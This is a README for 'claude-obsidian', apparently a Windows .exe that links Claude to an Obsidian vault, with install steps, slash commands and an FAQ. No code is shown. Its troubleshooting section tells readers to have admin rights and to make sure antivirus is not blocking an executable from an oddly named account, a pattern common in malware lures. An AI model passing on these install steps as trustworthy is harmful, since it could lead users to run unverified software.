# 🧠 claude-obsidian - Build a smarter digital knowledge base

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/unresentful-barbeque695/claude-obsidian)

## 📌 About this project

This application links your Claude intelligence with your Obsidian notes. It automates the process of gathering and saving information. You create a personal wiki that learns and grows as you work. The system mimics the way successful thinkers document their findings. It keeps your research organized and ready for future use.

## ⚙️ System requirements

Your computer must meet these basic needs to run the software:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel i5 or AMD Ryzen 5 or better.
*   Memory: 8 GB of RAM.
*   Storage Space: 500 MB for the application files.
*   Obsidian: The latest version installed on your device.
*   Internet: A stable connection for data syncing.

## 🚀 How to download the software

Follow these steps to get the program on your computer:

1. Visit the [official releases page](https://github.com/unresentful-barbeque695/claude-obsidian).
2. Look for the section labeled "Assets."
3. Select the file ending in .exe for a Windows installer.
4. Save the file to your Downloads folder.
5. Double-click the file to begin the installation process.
6. Follow the instructions that appear on your screen.

## 🛠️ Setting up your vault

Once you install the software, you must link it to your Obsidian workspace. 

1. Open the Claude-Obsidian application from your Windows Start menu.
2. Locate the Settings menu in the top left corner.
3. Select "Vault Path" and navigate to the folder where you keep your Obsidian notes.
4. Provide your API key in the designated box if requested.
5. Click "Save" to apply your changes.

## 💡 Using the core features

The application uses specific text commands to trigger actions. Type these into the chat window to interact with your vault:

*   /wiki: This command searches your existing notes for relevant information on a topic.
*   /save: This command sends the current conversation directly to a new file in your Obsidian vault.
*   /autoresearch: This command instructs the system to look for recent developments and draft a summary note for you.

## 📂 Understanding the workflow

This tool helps you build a second brain. You act as the editor while the system handles the research. When you use the /save command, the system creates a clean markdown file in your vault. These files contain links to related notes. This structure allows your knowledge to compound over time. You spend less time searching for data and more time building relationships between ideas.

## ❓ Frequently asked questions

Do I need to pay for a subscription?
The software is free to use. You only need to manage your own API costs for the model provider.

Can I move my vault later?
Yes. You can change the folder location at any time in the Settings menu.

How do I update the software?
The program checks for updates each time you open it. It will prompt you to install current versions automatically.

Does this send my files to the cloud?
No. Your notes remain on your local hard drive. Only the prompts you write get sent to the AI service.

What happens if the app crashes?
The system creates a log file in the install folder. Use this file to diagnose issues if they happen. 

Is my privacy secure?
Yes. The application runs locally on your machine. You control your vault and your notes.

## 🔧 Troubleshooting

If the software does not open, check these items:

*   Make sure you have administrative rights on your Windows machine.
*   Verify that your antivirus software is not blocking the installation.
*   Check your internet connection to see if it reaches the API services.
*   Restart your computer to refresh system permissions.

## 📈 Improving your experience

To get the best results, use clear prompts. Instead of asking one large question, break your request into small parts. For example, use /wiki to find background information first. Then use /autoresearch to get updates. Finally, use /save to store the synthesis of those two actions. This pattern creates dense, useful notes.
